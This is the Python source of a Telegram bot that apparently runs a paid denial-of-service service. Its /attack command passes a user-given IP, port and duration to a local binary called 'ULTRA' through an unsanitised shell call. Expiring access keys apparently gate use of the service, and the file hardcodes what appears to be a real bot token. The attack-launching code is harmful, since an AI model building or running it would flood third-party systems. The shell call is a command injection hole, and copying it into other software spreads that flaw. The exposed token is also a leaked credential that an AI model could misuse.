import os
import asyncio
import secrets
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7092345328:AAFph1hrE8sWnhUiIRdJ_uiOs_V_ojL5vDA'
ALLOWED_USER_ID = 6135948216
bot_access_free = True

generated_key = None
key_redeemed = False
redeem_time = None
key_expiry_time = None

def convert_to_seconds(duration: str):
    try:
        if 'd' in duration:
            days = int(duration.replace('d', '').strip())
            return days * 24 * 60 * 60
        elif 'h' in duration:
            hours = int(duration.replace('h', '').strip())
            return hours * 60 * 60
        elif 'm' in duration:
            minutes = int(duration.replace('m', '').strip())
            return minutes * 60
        else:
            return None
    except ValueError:
        return None

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def genkey(update: Update, context: CallbackContext):
    global generated_key, key_expiry_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) < 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey <duration> (e.g., 1d, 2h, 30m)*", parse_mode='Markdown')
        return

    duration = args[0]
    expiry_in_seconds = convert_to_seconds(duration)

    if not expiry_in_seconds:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration format! Please use days (d), hours (h), or minutes (m).*", parse_mode='Markdown')
        return

    generated_key = secrets.token_urlsafe(16)
    key_expiry_time = time.time() + expiry_in_seconds

    global key_redeemed, redeem_time
    key_redeemed = False
    redeem_time = None

    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Your generated key: {generated_key}*\n*🕒 Expires in {duration}*", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    global generated_key, key_redeemed, redeem_time, key_expiry_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
        return

    if key_redeemed:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has already been redeemed!*", parse_mode='Markdown')
        return

    if key_expiry_time and time.time() > key_expiry_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has expired!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = args[0]

    if key == generated_key:
        key_redeemed = True
        redeem_time = time.time()
        await context.bot.send_message(chat_id=chat_id, text="*✅ Key redeemed successfully!* You now have access to the service.", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid key!* Please check your key and try again.", parse_mode='Markdown')

async def redeem_time(update: Update, context: CallbackContext):
    global redeem_time, key_expiry_time

    chat_id = update.effective_chat.id

    if not redeem_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has not been redeemed yet!*", parse_mode='Markdown')
        return

    time_elapsed = time.time() - redeem_time
    minutes = int(time_elapsed // 60)
    seconds = int(time_elapsed % 60)

    if key_expiry_time and time.time() > key_expiry_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has expired!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=f"*⌛ The key was redeemed {minutes} minute(s) and {seconds} second(s) ago.*", parse_mode='Markdown')

# Help command function
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    help_message = (
        "*💡 Available Commands:*\n\n"
        "/start - Welcome message and instructions on using the bot.\n"
        "/attack <ip> <port> <duration> - Launch an attack on the specified IP and port.\n"
        "/genkey <duration> - Generate a secure key with an expiry duration (e.g., 1d, 2h, 30m).\n"
        "/redeem <key> - Redeem the key to gain access to the service.\n"
        "/redeem_time - View how much time has passed since the key was redeemed.\n"
        "/help - Show this help message with all available commands."
    )
    await context.bot.send_message(chat_id=chat_id, text=help_message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("redeem_time", redeem_time))
    application.add_handler(CommandHandler("help", help_command))  # Add the help command handler

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
